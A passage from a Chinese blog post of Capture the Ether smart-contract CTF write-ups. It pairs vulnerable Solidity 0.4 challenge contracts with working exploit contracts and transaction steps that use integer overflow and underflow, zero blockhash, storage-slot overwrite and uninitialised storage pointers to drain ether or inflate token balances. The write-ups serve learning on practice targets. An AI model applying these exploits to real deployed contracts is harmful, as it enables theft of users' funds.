-<p>不管有没有出现错误提示，直接执行即可。出现错误提示仅仅意味着，在以太坊节点模拟执行的时候会出错，这是因为根据模拟执行的最新区块号算出的answer不正确。不出现错误也仅仅意味着根据模拟执行的最新区块号算出的answer正确。只有根据实际执行的最新区块号算出的answer正确才行，所以直接一直执行就可以了。</p>
-<h3 id="Predict-the-block-hash"><a href="#Predict-the-block-hash" class="headerlink" title="Predict the block hash"></a><a target="_blank" rel="noopener" href="https://capturetheether.com/challenges/lotteries/predict-the-block-hash/">Predict the block hash</a></h3><ul>
-<li>题目</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract PredictTheBlockHashChallenge &#123;</span><br><span class="line">    address guesser;</span><br><span class="line">    bytes32 guess;</span><br><span class="line">    uint256 settlementBlockNumber;</span><br><span class="line"></span><br><span class="line">    function PredictTheBlockHashChallenge() public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function lockInGuess(bytes32 hash) public payable &#123;</span><br><span class="line">        require(guesser == 0);</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line"></span><br><span class="line">        guesser = msg.sender;</span><br><span class="line">        guess = hash;</span><br><span class="line">        settlementBlockNumber = block.number + 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function settle() public &#123;</span><br><span class="line">        require(msg.sender == guesser);</span><br><span class="line">        require(block.number &gt; settlementBlockNumber);</span><br><span class="line"></span><br><span class="line">        bytes32 answer = block.blockhash(settlementBlockNumber);</span><br><span class="line"></span><br><span class="line">        guesser = 0;</span><br><span class="line">        if (guess == answer) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>Write-Up</li>
-</ul>
-<p><img src="/.gitbook/assets/blockchain-ctf-predictHash.png"></p>
-<p>故只需要answer&#x3D;0，并等待最新的区块比调用函数时的区块大256时即可。</p>
-<h2 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h2><h3 id="Token-sale"><a href="#Token-sale" class="headerlink" title="Token sale"></a><a target="_blank" rel="noopener" href="https://capturetheether.com/challenges/math/token-sale/">Token sale</a></h3><ul>
-<li><p>题目</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract TokenSaleChallenge &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public balanceOf;</span><br><span class="line">    uint256 constant PRICE_PER_TOKEN = 1 ether;</span><br><span class="line"></span><br><span class="line">    function TokenSaleChallenge(address _player) public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance &lt; 1 ether;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function buy(uint256 numTokens) public payable &#123;</span><br><span class="line">        require(msg.value == numTokens * PRICE_PER_TOKEN);</span><br><span class="line"></span><br><span class="line">        balanceOf[msg.sender] += numTokens;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function sell(uint256 numTokens) public &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;= numTokens);</span><br><span class="line"></span><br><span class="line">        balanceOf[msg.sender] -= numTokens;</span><br><span class="line">        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-</li>
-<li><p>Write-Up</p>
-</li>
-</ul>
-<p>没有溢出保护，构造溢出。</p>
-<p>思路：构造溢出有两种思路。</p>
-<ol>
-<li><p>第一种思路是希望在<code>sell(uint256 numTokens)</code>中构造溢出，即思路是卖比实际价值更少的代币，获得更多的以太。</p>
-<p>这里能溢出的地方只有</p>
-<blockquote>
-<p>balanceOf[msg.sender] -&#x3D; numTokens; </p>
-<p>和</p>
-<p> numTokens * PRICE_PER_TOKEN</p>
-</blockquote>
-<p>若构造减法溢出，即希望<code>balanceOf[msg.sender]</code>被负溢出，成为一个极大的值。但是由于<code>require(balanceOf[msg.sender] &gt;= numTokens);</code>，该溢出无法做到。</p>
-<p>若构造乘法溢出，即希望<code>numTokens * PRICE_PER_TOKEN</code>溢出，得到一个极小的值。这样反而得到的以太变少了。</p>
-<p>故不在<code>sell(uint256 numTokens)</code>中构造溢出。</p>
-</li>
-<li><p>第一种是在<code>buy(uint256 numTokens)</code>中构造溢出。</p>
-<p>这里同样有两处可以溢出。</p>
-<blockquote>
-<p>numTokens * PRICE_PER_TOKEN</p>
-<p>和</p>
-<p>balanceOf[msg.sender] +&#x3D; numTokens;</p>
-</blockquote>
-<p>若构造<code>balanceOf[msg.sender] += numTokens;</code>的溢出，仍然无意义。</p>
-<p>正确溢出构造：构造<code>buy(uint256 numTokens)</code>中的<code>numTokens * PRICE_PER_TOKEN</code>溢出。</p>
-<p>即构造大数<code>numToken。</code>使得<code>numTokens * PRICE_PER_TOKEN</code>溢出，得到一个极小值。最终的结果是用极少量的钱购买了大量代币。</p>
-<p>本次攻击合约如下：</p>
-</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract TokenSaleChallenge &#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract exploit &#123;</span><br><span class="line">    address addrContractToken;</span><br><span class="line">    uint256 constant PRICE_PER_TOKEN = 1 ether;</span><br><span class="line"></span><br><span class="line">    function attackerBuy(address addr) public payable &#123;</span><br><span class="line"></span><br><span class="line">        addrContractToken = addr;</span><br><span class="line"></span><br><span class="line">        uint256 makeOverflow = 2**256-1;</span><br><span class="line">        uint256 overflowNumTokens = makeOverflow / PRICE_PER_TOKEN + 1;</span><br><span class="line"></span><br><span class="line">        TokenSaleChallenge contractToken = TokenSaleChallenge(addrContractToken);</span><br><span class="line">        contractToken.buy.value(415992086870360064)(overflowNumTokens);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attackerSell()public&#123;</span><br><span class="line">        TokenSaleChallenge contractToken = TokenSaleChallenge(addrContractToken);</span><br><span class="line">        contractToken.sell(1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function () public payable&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>​        攻击步骤：</p>
-<ol>
-<li><p>执行<code>attackerBuy(address addr)</code>，并附带415992086870360064 Wei</p>
-<p><code>addr</code>是挑战合约的地址，<code>overflowNumTokens</code>即我们构造的大数。它和<code>PRICE_PER_TOKEN</code>相乘后会溢出，得到一个不到1 ether 的值。该值经过事先计算，为415992086870360064。</p>
-</li>
-<li><p>执行attackerSell()</p>
-</li>
-</ol>
-<h3 id="Token-whale"><a href="#Token-whale" class="headerlink" title="Token whale"></a><a target="_blank" rel="noopener" href="https://capturetheether.com/challenges/math/token-whale/">Token whale</a></h3><ul>
-<li>题目</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract TokenWhaleChallenge &#123;</span><br><span class="line">    address player;</span><br><span class="line"></span><br><span class="line">    uint256 public totalSupply;</span><br><span class="line">    mapping(address =&gt; uint256) public balanceOf;</span><br><span class="line">    mapping(address =&gt; mapping(address =&gt; uint256)) public allowance;</span><br><span class="line"></span><br><span class="line">    string public name = &quot;Simple ERC20 Token&quot;;</span><br><span class="line">    string public symbol = &quot;SET&quot;;</span><br><span class="line">    uint8 public decimals = 18;</span><br><span class="line"></span><br><span class="line">    function TokenWhaleChallenge(address _player) public &#123;</span><br><span class="line">        player = _player;</span><br><span class="line">        totalSupply = 1000;</span><br><span class="line">        balanceOf[player] = 1000;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return balanceOf[player] &gt;= 1000000;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    event Transfer(address indexed from, address indexed to, uint256 value);</span><br><span class="line"></span><br><span class="line">    function _transfer(address to, uint256 value) internal &#123;</span><br><span class="line">        balanceOf[msg.sender] -= value;</span><br><span class="line">        balanceOf[to] += value;</span><br><span class="line"></span><br><span class="line">        emit Transfer(msg.sender, to, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address to, uint256 value) public &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;= value);</span><br><span class="line">        require(balanceOf[to] + value &gt;= balanceOf[to]);</span><br><span class="line"></span><br><span class="line">        _transfer(to, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    event Approval(address indexed owner, address indexed spender, uint256 value);</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint256 value) public &#123;</span><br><span class="line">        allowance[msg.sender][spender] = value;</span><br><span class="line">        emit Approval(msg.sender, spender, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferFrom(address from, address to, uint256 value) public &#123;</span><br><span class="line">        require(balanceOf[from] &gt;= value);</span><br><span class="line">        require(balanceOf[to] + value &gt;= balanceOf[to]);</span><br><span class="line">        require(allowance[from][msg.sender] &gt;= value);</span><br><span class="line"></span><br><span class="line">        allowance[from][msg.sender] -= value;</span><br><span class="line">        _transfer(to, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><p>Write-Up</p>
-<p>这个合约有一个最大的漏洞在<code>transferFrom(address from, address to, uint256 value)</code>中，这个函数只对from地址做了值上的判断，但是实际的转账是调用了<code>_transfer(address to, uint256 value)，如下：</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function _transfer(address to, uint256 value) internal &#123;</span><br><span class="line">        balanceOf[msg.sender] -= value;</span><br><span class="line">        balanceOf[to] += value;</span><br><span class="line"></span><br><span class="line">        emit Transfer(msg.sender, to, value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>实际转账是从<code>msg.sender</code>转到<code>to</code>。这样可以实现<code>msg.sender</code>的余额小于<code>value</code>仍然可以做减法，造成负溢出。</p>
-<p>我们需要编写的只有一个工具合约，用来作为接收代币的工具人。工具合约如下，我们把部署后该合约的地址称作<code>toolContractAddr</code>：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract TokenWhaleChallenge &#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract toolContract&#123;</span><br><span class="line">    function approve(address player,address addrContractToken, uint256 value)&#123;</span><br><span class="line">        TokenWhaleChallenge contractToken = TokenWhaleChallenge(addrContractToken);</span><br><span class="line">        contractToken.approve(player,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>接下来就是人工操作进行攻击。</p>
-<ol>
-<li><p>向<code>TokenWhaleChallenge</code>合约发送<code>approve(toolContractAddr，1000)</code></p>
-<p>[为了许可向工具合约转移所有已有代币。数量至少1000。]</p>
-</li>
-<li><p>向<code>toolContract</code>合约发送<code>approve(自己的地址,挑战合约地址,1)</code></p>
-<p>[为了许可后续负溢出操作的转账行为，数量随便多少。最小只需要允许给自己的地址转一个代币即可做到负溢出。]</p>
-</li>
-<li><p>向<code>TokenWhaleChallenge</code>合约发送<code>transfer(toolContractAddr，1000)</code></p>
-<p>[把所有代币转移到工具合约处。为后续的负溢出操作做准备。此时自己的地址已经没有代币了。]</p>
-</li>
-<li><p>向<code>TokenWhaleChallenge</code>合约发送<code>transferfrom(toolContractAddr,toolContractAddr,1)</code></p>
-<p>[负溢出操作。]</p>
-<p>该操作的具体原理如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">function transferFrom(toolContractAddr,  toolContractAddr, 1) public &#123;</span><br><span class="line"></span><br><span class="line">		//toolContractAddr的余额为1000，大于1。通过。</span><br><span class="line">        require(balanceOf[from] &gt;= value);</span><br><span class="line">        </span><br><span class="line">        //toolContractAddr的余额 1000 + 1 = 1001，没有正溢出。通过。</span><br><span class="line">        require(balanceOf[to] + value &gt;= balanceOf[to]);</span><br><span class="line">        </span><br><span class="line">        //经过第2步allowance[from][msg.sender]为1，大于等于1.通过。</span><br><span class="line">        require(allowance[from][msg.sender] &gt;= value);</span><br><span class="line"></span><br><span class="line">        allowance[from][msg.sender] -= value;</span><br><span class="line">        _transfer(to, value);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">function _transfer(toolContractAddr, 1) internal &#123;</span><br><span class="line">		// balanceOf[msg.sender]此时由于第3步的转账，已经等于0，减一之后负溢出。</span><br><span class="line">        balanceOf[msg.sender] -= value;</span><br><span class="line">        </span><br><span class="line">        balanceOf[to] += value;</span><br><span class="line"></span><br><span class="line">        emit Transfer(msg.sender, to, value);</span><br><span class="line">    &#125;  </span><br></pre></td></tr></table></figure>
-
-<p>当然第3步也可以不把所有代币转完，只要第4步多转点就行了。但是要注意工具合约的余额是否大于负溢出所需要的数量。第1,2步也需要改变数量。</p>
-</li>
-</ol>
-</li>
-</ul>
-<h3 id="Retirement-fund"><a href="#Retirement-fund" class="headerlink" title="Retirement fund"></a><a target="_blank" rel="noopener" href="https://capturetheether.com/challenges/math/retirement-fund/">Retirement fund</a></h3><h3 id="Mapping"><a href="#Mapping" class="headerlink" title="Mapping"></a><a target="_blank" rel="noopener" href="https://capturetheether.com/challenges/math/mapping/">Mapping</a></h3><ul>
-<li>题目</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract MappingChallenge &#123;</span><br><span class="line">    bool public isComplete;</span><br><span class="line">    uint256[] map;</span><br><span class="line"></span><br><span class="line">    function set(uint256 key, uint256 value) public &#123;</span><br><span class="line">        // Expand dynamic array as needed</span><br><span class="line">        if (map.length &lt;= key) &#123;</span><br><span class="line">            map.length = key + 1;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        map[key] = value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get(uint256 key) public view returns (uint256) &#123;</span><br><span class="line">        return map[key];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><p>Write-Up</p>
-<p>这道题考察的知识点是 <strong>solidity底层如何存储storage变量</strong> 的，简单来说storage是一系列插槽，插槽总长度是2^256，每个插槽大小是256位，所以可以做到将一个变量把另外一个变量覆盖了的情况。详见：<a target="_blank" rel="noopener" href="https://solidity-cn.readthedocs.io/zh/develop/miscellaneous.html">https://solidity-cn.readthedocs.io/zh/develop/miscellaneous.html</a></p>
-<p>思路是利用<code>map</code>变量精准覆盖<code>isComplete</code>变量，覆盖为1。</p>
-<p>先上攻击代码，如下：</p>
-</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract MappingChallenge &#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract exploit&#123;</span><br><span class="line">    function attacker(address addr) public&#123;</span><br><span class="line">        bytes32 map_store_storage = keccak256(bytes32(1));</span><br><span class="line">        uint256 go_to_0_storage = 2**256-1-uint256(map_store_storage)+1;</span><br><span class="line">        MappingChallenge challeng_contract = MappingChallenge(addr);</span><br><span class="line">        challeng_contract.set(go_to_0_storage,1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>比较重要的几点如下：</p>
-<ol>
-<li><p>如何得到<code>keccak256(bytes32(1))</code>中的<code>1</code>的？</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">contract MappingChallenge &#123;</span><br><span class="line">    bool public isComplete;</span><br><span class="line">    uint256[] map;</span><br><span class="line">    // 按照storage定义的顺序，</span><br><span class="line">    ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h3 id="Donation"><a href="#Donation" class="headerlink" title="Donation"></a><a target="_blank" rel="noopener" href="https://capturetheether.com/challenges/math/donation/">Donation</a></h3><ul>
-<li>题目</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract DonationChallenge &#123;</span><br><span class="line">    struct Donation &#123;</span><br><span class="line">        uint256 timestamp;</span><br><span class="line">        uint256 etherAmount;</span><br><span class="line">    &#125;</span><br><span class="line">    Donation[] public donations;</span><br><span class="line"></span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    function DonationChallenge() public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">        </span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function donate(uint256 etherAmount) public payable &#123;</span><br><span class="line">        // amount is in ether, but msg.value is in wei</span><br><span class="line">        uint256 scale = 10**18 * 1 ether;</span><br><span class="line">        require(msg.value == etherAmount / scale);</span><br><span class="line"></span><br><span class="line">        Donation donation;</span><br><span class="line">        donation.timestamp = now;</span><br><span class="line">        donation.etherAmount = etherAmount;</span><br><span class="line"></span><br><span class="line">        donations.push(donation);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        </span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>Write-Up</li>
-</ul>
-<p>本题的缺陷在于：<code>Solidity ^0.4.0</code>版本，<strong>Unintialised Storage Pointers（未初始化的存储指针），也叫未初始化的 storage 指针</strong>漏洞。</p>
-<p>EVM中会将数据存储为 storage 或 memory ，在函数中局部变量的默认类型取决于它们本身的类型，未进行初始化的 storage 变量，会指向合约中的其他变量，从而改变其他变量的值，常见的场景就是指向状态变量，改变状态变量的值，导致漏洞的产生。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function donate(uint256 etherAmount) public payable &#123;</span><br><span class="line">        // amount is in ether, but msg.value is in wei</span><br><span class="line">        uint256 scale = 10**18 * 1 ether;</span><br><span class="line">        require(msg.value == etherAmount / scale);</span><br><span class="line">        </span><br><span class="line">		//漏洞所在，实际是指向了storage。</span><br><span class="line">        Donation donation;</span><br><span class="line">        </span><br><span class="line">        //改变donation的值，实际是改变了storage中其他状态变量的值。</span><br><span class="line">        donation.timestamp = now;//改变了storage插槽0的值</span><br><span class="line">        donation.etherAmount = etherAmount;//改变了storage插槽1的值</span><br><span class="line">        ...</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
-
-<p>具体查看网址：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/154407">https://www.anquanke.com/post/id/154407</a></p>
-<p>所以攻击的思路就是通过<code>donation</code>的漏洞 覆盖 <code>owner</code>变量，改变成为自己的地址即可。</p>
-<p>攻击合约代码如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract DonationChallenge &#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract exploit&#123;</span><br><span class="line">    uint256 value;</span><br><span class="line"></span><br><span class="line">    function computeValue()public returns (uint256)&#123;</span><br><span class="line">        uint256 scale = 10**18 * 1 ether;</span><br><span class="line">        value = uint256(address(this))/scale;</span><br><span class="line">        return value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attacter(address addr)public payable&#123;</span><br><span class="line">        </span><br><span class="line">        DonationChallenge challengeContract = DonationChallenge(addr);</span><br><span class="line">        //实际挑战合约会执行donation.etherAmount = uint256(address(this));，即把owner变为uint256(address(this))</span><br><span class="line">        challengeContract.donate.value(value)(uint256(address(this)));</span><br><span class="line">        challengeContract.withdraw();</span><br><span class="line"></span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function()payable&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>疑问：</p>
-<p>攻击合约中<code>function computeValue()</code>应该返回value值的，但是remix并不返回任何东西。虽然这个问题不影响攻击合约的使用，实际上uint256 value变量也做了变化。只是感到很奇怪，这是remix的bug吗？尝试用javaVM部署，发现有返回值，但是在ropsten测试网上就没有返回值，可以深入研究。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://example.com/2022/03/17/blockchain/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Karry-Almond">
-      <meta itemprop="description" content="区块链">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Karry blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/03/17/blockchain/" class="post-title-link" itemprop="url">Untitled</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
